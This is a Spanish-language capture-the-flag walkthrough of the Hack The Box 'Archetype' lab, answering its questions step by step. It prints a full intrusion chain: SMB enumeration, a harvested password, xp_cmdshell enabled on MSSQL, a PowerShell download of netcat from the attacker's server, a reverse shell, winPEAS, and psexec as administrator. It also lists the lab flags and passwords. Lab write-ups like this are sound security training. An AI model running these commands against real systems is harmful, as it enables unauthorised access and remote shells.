---
title: Máquina Archetype
published: true
---

Jorge Marco Arráez

## [](#header-3) 1)  Which TCP port is hosting a database server?

sudo nmap -sS --min-rate 5000 -p- -n -Pn $IP
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 18:25 UTC
    Nmap scan report for 10.129.76.19
    Host is up (0.046s latency).
    Not shown: 65529 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    49664/tcp open  unknown
    49665/tcp open  unknown
    49669/tcp open  unknown

este escaneo no me ha dado un puerto de cuatro dígitos, que es lo que me pide HTB, asi que llevo otro a cabo 

```
sudo nmap -sCV --min-rate 5000 -p- -n -Pn $IP
sudo nmap -sCV --min-rate 5000 -A -vvv -Pn -n -p 1433,139,445 -oN mainports $IP
```

1433/tcp open  ms-sql-s     syn-ack ttl 128 Microsoft SQL Server 2017 14.00.1000.00; RTM

El puerto que buscamos es el 1433

## [](#header-3) 2) What is the name of the non-Administrative share available over SMB?

smbclient -L $IP
root

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC


backups

## [](#header-3) 3)  What is the password identified in the file on the SMB share?

smbclient \\\\$IP\\backups
ls
get prod.dtsConfig
M3g4c0rp123

## [](#header-3) 4)  What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

https://github.com/SecureAuthCorp/impacket/tree/master/examples

En la carpeta examples está el código que necesitamos

mssqlclient.py

## [](#header-3) 5)  What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

xp_cmdshell

## [](#header-3) 6)  What script can be used in order to search possible paths to escalate privileges on Windows hosts?

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

winpeas

## [](#header-3) 7)  What file contains the administrator's password?

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth


tengo las siguientes herramientas:
	-> winpeas
	-> mssqlclient.py
	-> xp_cmdshell

cuando uso el programa de mssqlclient y me autentico con la contraseña que hemos conseguido antes,
entro a una base de datos que usa mssql. ahora la dificultad está en saber manejarse por una mssql.

listo las bases de datos que hay:

```
SELECT name FROM master.sys.databases 
```

master
tempdb
model
msdb

pruebo con msdb

(https://chartio.com/resources/tutorials/sql-server-list-tables-how-to-show-all-tables/)
(https://stackoverflow.com/questions/147659/get-list-of-databases-from-sql-server)

USE msdb
SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
SELECT name FROM SYSOBJECTS WHERE xtype = 'U';

SELECT * FROM INFORMATION_SCHEMA.TABLES;

Las tablas que tiene la base de datos master son:

```
spt_fallback_db
spt_fallback_dev
spt_fallback_usg
spt_values
spt_monitor
MS_replication_options 
```

Tras estar un rato mirando las bases de datos llego a la conclusion de que no hay nada interesante en ellas.

Leyendo hacktricks he visto que se puede habilitar el xp_cmdshell, así que:

```
sp_configure 'show advanced options', '1'
RECONFIGURE

sp_configure 'xp_cmdshell', '1'
RECONFIGURE

EXEC master..xp_cmdshell 'whoami'
-> archetype\sql_svc
```

A partir de ahora tengo que mirar el walkthrough.

El objetivo es establecer una reverse shell. Descargaremos nc64.exe y en esa carpeta, ejecutaremos el siguiente comando: 

```
sudo python3 -m http.server 80
```
Así abrimos el puerto 80 para poder conectarnos a nuestro ordenador desde la consola de la maquina que esta hosteando la base de datos.

Usaremos netcat para escuchar por el puerto 443:

```
sudo nc -lvnp 443
```

Mi direccion IP es esta: 10.10.14.110.

Así que si desde la ventana de sql hacemos:

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.110/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.110 443"
```

## [](#header-3) 8)  Submit user flag

```
cd C:\Users\sql_svc\Desktop
dir
type user.txt
```

```
user=3e7b102e78218e935bf3f4951fec21a3
```

```
powershell
wget http://10.10.14.110/winPEASx64.exe -outfile winPEASx64.exe
./winPEASx64.exe
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
text ConsoleHost_history.txt
```
Con esto obtenemos la contraseña de administrator que es: "MEGACORP_4dm1n!!"


## [](#header-3) 9) Submit root flag

Ahora, con psexec.py y la contraseña que hemos hallado antes:

```
python3 psexec.py administrator@$IP
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

```
root=b91ccec3305e98240082d4474b848528
```
